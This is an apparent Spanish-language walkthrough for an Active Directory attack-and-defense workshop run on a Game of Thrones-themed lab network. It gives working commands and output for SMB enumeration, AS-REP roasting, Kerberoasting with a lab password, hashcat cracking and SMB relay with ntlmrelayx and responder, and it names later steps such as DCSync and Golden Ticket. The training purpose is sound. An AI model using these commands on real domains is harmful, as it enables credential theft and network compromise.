# Atacando

Este directorio contiene la información de ataque para el workshop de "Ataque y Defensa de Active Directory".

### Enumeración Inicial
```shell
nxc smb 10.4.10.0/24

SMB         10.4.10.12      445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         10.4.10.22      445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         10.4.10.11      445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.4.10.10      445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.4.10.23      445    BRAAVOS          [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
``` 

Se identifican 3 dominios:
- north.sevenkingdoms.local
- sevenkingdoms.local
- essos.local

Identificando los controladores de dominio:
```shell
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 10.4.10.10
_ldap._tcp.dc._msdcs.sevenkingdoms.local        service = 0 100 389 kingslanding.sevenkingdoms.local

nslookup -type=srv _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 10.4.10.10
_ldap._tcp.dc._msdcs.north.sevenkingdoms.local  service = 0 100 389 winterfell.north.sevenkingdoms.local

nslookup -type=srv _ldap._tcp.dc._msdcs.essos.local 10.4.10.10
_ldap._tcp.dc._msdcs.essos.local        service = 0 100 389 meereen.essos.local

```

Por temas de kerberos, ponemos esta información en el `/etc/hosts`
```
# GOAD
10.4.10.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
10.4.10.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
10.4.10.12   essos.local meereen.essos.local meereen
10.4.10.22   castelblack.north.sevenkingdoms.local castelblack
10.4.10.23   braavos.essos.local braavos
```

Para que Linux soporte kerberos instalamos el paquete `krb5-user` y luego deditamos `/etc/krb5.conf`

```conf
[libdefaults]
  default_realm = essos.local
  kdc_timesync = 1
  ccache_type = 4
  forwardable = true
  proxiable = true
  fcc-mit-ticketflags = true
[realms]
  north.sevenkingdoms.local = {
      kdc = winterfell.north.sevenkingdoms.local
      admin_server = winterfell.north.sevenkingdoms.local
  }
  sevenkingdoms.local = {
      kdc = kingslanding.sevenkingdoms.local
      admin_server = kingslanding.sevenkingdoms.local
  }
  essos.local = {
      kdc = meereen.essos.local
      admin_server = meereen.essos.local
  }
```

Enumerando usuarios de manera no autenticada:
```shell
nxc smb 10.4.10.0/24 --users

SMB         10.4.10.11      445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.4.10.11      445    WINTERFELL       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.4.10.11      445    WINTERFELL       arya.stark                    2025-02-18 02:39:59 0       Arya Stark
SMB         10.4.10.11      445    WINTERFELL       sansa.stark                   2025-02-18 02:40:11 0       Sansa Stark
SMB         10.4.10.11      445    WINTERFELL       brandon.stark                 2025-02-18 02:40:14 0       Brandon Stark
SMB         10.4.10.11      445    WINTERFELL       rickon.stark                  2025-02-18 02:40:17 0       Rickon Stark
SMB         10.4.10.11      445    WINTERFELL       hodor                         2025-02-18 02:40:20 0       Brainless Giant
SMB         10.4.10.11      445    WINTERFELL       jon.snow                      2025-02-18 02:40:23 0       Jon Snow
SMB         10.4.10.11      445    WINTERFELL       samwell.tarly                 2025-02-18 02:40:26 0       Samwell Tarly (Password : WKSU0nKr+Kyn6zL7e4gPAw==)
SMB         10.4.10.11      445    WINTERFELL       jeor.mormont                  2025-02-18 02:40:28 0       Jeor Mormont
SMB         10.4.10.11      445    WINTERFELL       sql_svc                       2025-02-18 02:40:31 0       sql service
```

### Acceso Inicial
Técnicas utilizadas por hackers una vez que alcanzan la red corporativa.
- ASREPRoasting

Usuario vulnerable es `north\brandon.stark`

```shell
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt

hashcat -m 18200 asrephash hackyou.txt
```
- Kerberoasting

Usuario vulnerable es `north\jon.snow`

```shell
GetUserSPNs.py -request -dc-ip 10.4.10.11 north.sevenkingdoms.local/brandon.stark:plaintextrocks -outputfile kerberoasting.hashes

nxc ldap 10.4.10.11 -u brandon.stark -p 'plaintextrocks' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING

hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/hackyou.txt --force
```

> En caso de tener el problema `KRB_AP_ERR_SKEW(Clock skew too great)`, esto se resuelve con `rdate -n 10.4.10.11`

- SMB Relay

```shell
nxc smb 10.4.10.10-23 --gen-relay-list relay.txt
```

Se modifica la configuración de responder para apagar la opción **SMB** y **HTTP**, las localidades comunes son:
- `/etc/responder/Responder.conf`
- `/usr/share/responder/Responder.conf`

```shell
ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
responder -I goad
```


Usuarios afectados son `robb.stark` y `eddard.stark`

### Explotación
Técnicas de Movimiento Lateral, Escalada de Privilegios y/o Enumeración de AD
- Enumeración con Bloodhound
- ADCS ESC1
- Abusos de ACL
  - Generic Write
  - Shadow Credentials
- Pass-the-Hash

### Post-Explotación
Técnicas utilizadas por hackers para mantener persistencia en el dominio
- Golden Ticket
- DCSync (NTDS.dit)